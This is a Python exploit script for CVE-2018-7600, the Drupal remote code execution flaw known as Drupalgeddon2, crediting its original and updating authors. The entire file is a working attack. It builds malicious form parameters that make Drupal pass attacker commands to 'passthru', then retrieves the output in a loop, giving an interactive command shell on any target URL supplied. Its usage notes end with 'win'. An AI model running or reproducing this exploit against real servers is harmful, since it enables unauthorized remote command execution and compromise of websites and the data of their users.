#!/usr/bin/env python3

"""
Written by Christian Mehlmauer
  https://firefart.at/
  https://twitter.com/_FireFart_
  https://github.com/FireFart

Updated by superkojiman
  https://github.com/superkojiman/CVE-2018-7600

This script can be obtained from:
  https://github.com/FireFart/CVE-2018-7600

Requirements:
  - python3
  - python requests (pip install requests)

Usage:
  - Install dependencies
  - provide target as argument to the script
  - run the code
  - win
"""

import requests
import re
import sys

if __name__ == "__main__":

    if len(sys.argv) < 2:
        print("Usage: ./poc.py http://target.ip")
        sys.exit(0)

    HOST = sys.argv[1]

    print("Connected to", HOST)
    print("Ctrl-C to quit")

    while True:
        cmd = input("> ")

        get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#markup]':cmd, 'name[#type]':'markup'}
        post_params = {'form_id':'user_pass', '_triggering_element_name':'name'}
        r = requests.post(HOST, data=post_params, params=get_params)

        m = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', r.text)
        if m:
            found = m.group(1)
            get_params = {'q':'file/ajax/name/#value/' + found}
            post_params = {'form_build_id':found}
            r = requests.post(HOST, data=post_params, params=get_params)
            d = r.text
            print(d.rpartition("\n")[0])
